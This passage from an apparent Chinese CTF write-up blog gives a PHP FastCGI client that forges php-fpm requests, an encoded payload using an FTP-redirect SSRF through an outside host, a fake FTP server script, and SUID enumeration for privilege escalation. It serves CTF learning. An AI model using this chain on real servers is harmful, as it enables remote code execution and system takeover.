function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a set of FastCGI Name value pairs</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array of NVPair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$length</span> === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$p</span> != <span class="hljs-variable">$length</span>) &#123;<br>            <span class="hljs-variable">$nlen</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$nlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$nlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$nlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$nlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$vlen</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$vlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$vlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$vlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$vlen</span> |= (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$array</span>[<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$nlen</span>)] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>+<span class="hljs-variable">$nlen</span>, <span class="hljs-variable">$vlen</span>);<br>            <span class="hljs-variable">$p</span> += (<span class="hljs-variable">$nlen</span> + <span class="hljs-variable">$vlen</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Decode a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data String containing all the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodePacketHeader</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;version&#x27;</span>]       = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">0</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;type&#x27;</span>]          = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">1</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;requestId&#x27;</span>]     = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">2</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">3</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">4</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">5</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">6</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;reserved&#x27;</span>]      = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">7</span>&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPacket</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$packet</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HEADER_LEN</span>)) &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">decodePacketHeader</span>(<span class="hljs-variable">$packet</span>);<br>            <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$len</span>  = <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>];<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &amp;&amp; <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$len</span>)) &#123;<br>                    <span class="hljs-variable">$len</span> -= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$buf</span>);<br>                    <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] .= <span class="hljs-variable">$buf</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$resp</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get Informations on the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $requestedInfo information to retrieve</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getValues</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$requestedInfo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>        <span class="hljs-variable">$request</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$requestedInfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$info</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildNvpair</span>(<span class="hljs-variable">$info</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">GET_VALUES</span>, <span class="hljs-variable">$request</span>, <span class="hljs-number">0</span>));<br>        <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readPacket</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">GET_VALUES_RESULT</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readNvpair</span>(<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>], <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;length&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Execute a request to the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $params Array of parameters</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $stdin Content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//        $this-&gt;connect();</span><br>        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">BEGIN_REQUEST</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">RESPONDER</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$this</span>-&gt;_keepAlive) . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>));<br>        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildNvpair</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-variable">$paramsRequest</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-variable">$stdin</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?file=ftp://ip:9999/&amp;data=&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$request</span>));<br><span class="hljs-comment">//        fwrite($this-&gt;_sock, $request);</span><br><span class="hljs-comment">//        do &#123;</span><br><span class="hljs-comment">//            $resp = $this-&gt;readPacket();</span><br><span class="hljs-comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span><br><span class="hljs-comment">//                $response .= $resp[&#x27;content&#x27;];</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span><br><span class="hljs-comment">//        var_dump($resp);</span><br><span class="hljs-comment">//        if (!is_array($resp)) &#123;</span><br><span class="hljs-comment">//            throw new Exception(&#x27;Bad request&#x27;);</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span><br><span class="hljs-comment">//            case self::CANT_MPX_CONN:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::OVERLOADED:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::UNKNOWN_ROLE:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::REQUEST_COMPLETE:</span><br><span class="hljs-comment">//                return $response;</span><br><span class="hljs-comment">//        &#125;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// real exploit start here</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="hljs-comment">//    die(&quot;Check your input\n&quot;);</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span><br><span class="hljs-comment">//    $filepath = __FILE__;</span><br><span class="hljs-comment">//&#125;else&#123;</span><br><span class="hljs-comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&quot;/var/www/html/add_api.php&quot;</span>;<br><span class="hljs-variable">$req</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filepath</span>);<br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$req</span> .<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-string">&#x27;command=whoami&#x27;</span>;<br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FCGIClient</span>(<span class="hljs-string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="hljs-number">1</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="hljs-comment">// php payload -- Doesnt do anything</span><br><span class="hljs-variable">$php_value</span> = <span class="hljs-string">&quot;unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = evilso.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>; <span class="hljs-comment">// extension_dir即为.so文件所在目录</span><br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="hljs-variable">$filepath</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="hljs-variable">$req</span>,<br>    <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="hljs-string">&#x27;command=whoami&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="hljs-variable">$uri</span>,<br>    <span class="hljs-string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="hljs-variable">$req</span>,<br><span class="hljs-comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span><br>    <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="hljs-variable">$php_value</span>,<br>    <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="hljs-string">&#x27;ctfking/Tajang&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;9001&#x27;</span>, <span class="hljs-comment">// 找准服务端口</span><br>    <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;80&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)<br>);<br><span class="hljs-comment">// print_r($_REQUEST);</span><br><span class="hljs-comment">// print_r($params);</span><br><span class="hljs-comment">//echo &quot;Call: $uri\n\n&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">request</span>(<span class="hljs-variable">$params</span>, <span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>用它生成如下payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">hack.php?file=ftp://101.43.238.159:9999/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02H%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+evilso.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0ESERVER_SOFTWAREctfking%2FTajang%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<br></code></pre></td></tr></table></figure><p>然后在vps上用如下脚本起一个虚假的ftp服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 welcome\n&#x27;</span>)<br><span class="hljs-comment">#Service ready for new user.</span><br><span class="hljs-comment">#Client send anonymous username</span><br><span class="hljs-comment">#USER anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\n&#x27;</span>)<br><span class="hljs-comment">#User name okay, need password.</span><br><span class="hljs-comment">#Client send anonymous password.</span><br><span class="hljs-comment">#PASS anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\n&#x27;</span>)<br><span class="hljs-comment">#User logged in, proceed. Logged out if appropriate.</span><br><span class="hljs-comment">#TYPE I</span><br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)<br><span class="hljs-comment">#Size /</span><br>conn.send(<span class="hljs-string">b&#x27;550 Could not get the file size.\n&#x27;</span>)<br><span class="hljs-comment">#EPSV (1)</span><br>conn.send(<span class="hljs-string">b&#x27;150 ok\n&#x27;</span>)<br><span class="hljs-comment">#PASV</span><br>conn.send(<span class="hljs-string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="hljs-comment">#STOR / (2) 注意打到9001端口的服务</span><br>conn.send(<span class="hljs-string">b&#x27;150 Permission denied.\n&#x27;</span>)<br><span class="hljs-comment">#QUIT</span><br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\n&#x27;</span>)<br>conn.close()<br><br></code></pre></td></tr></table></figure><p>然后执行即可弹shell</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220712111935.png"></p><p>但是还需要一个suid提权，没有权限拿flag</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220712112337.png"></p><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查看具有suid权限的文件</p><p>可以看到php命令有权限</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220712112556.png"></p><p>但还是要绕过一下open_basedir</p><p>就跟之前的绕过方式一样</p><p>然后即可getflag</p><p><img src="C:\Users\kaife\AppData\Roaming\Typora\typora-user-images\image-20220712112916529.png" alt="image-20220712112916529"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/11/TKCTF%20%E7%99%BD%E7%BB%99%E7%9A%84shell%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/11/TKCTF%20%E7%99%BD%E7%BB%99%E7%9A%84shell%E5%A4%8D%E7%8E%B0/</url>
    
